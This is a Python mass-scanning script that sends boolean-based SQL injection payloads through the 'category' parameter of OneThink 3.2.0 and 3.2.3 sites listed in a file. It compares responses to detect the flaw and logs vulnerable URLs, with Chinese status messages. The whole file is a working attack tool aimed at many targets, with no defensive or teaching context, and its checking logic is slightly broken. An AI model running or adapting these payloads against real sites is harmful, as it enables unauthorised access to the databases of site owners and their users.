import requests

urls = open('url.txt')

for i in urls:
    url = i.rstrip("\n")
    reqlst = []
    payload1 = [r"/index.php?c=article&a=index&category[0]==0))+and+1=1%23between&category[1]=a",
                r"/index.php?c=article&a=index&category[0]==0))+and+1=2%23between&category[1]=a"]
    for payload in payload1:
        vulnurl = url + payload
        try:
            print(vulnurl)
            req = requests.get(vulnurl, timeout=2, verify=False)
            reqlst.append(str(req.text))
            if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]:
                print("[+]存在onethink3.2.0 SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('洞3-2-0.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
        except:
            print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    reqlst = []
    payload2 = [r"/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a",
                r"/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
    for payload in payload2:
        vulnurl = url + payload
        try:
            print(vulnurl)
            req = requests.get(vulnurl, timeout=10, verify=False)
            reqlst.append(str(req.text))
            if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]:
                print("[+]存在onethink3.2.3 SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('洞3-2-3.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
        except:
            print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    else:
        print("[-]不存在onethink_category_sqli漏洞", "white", "on_grey")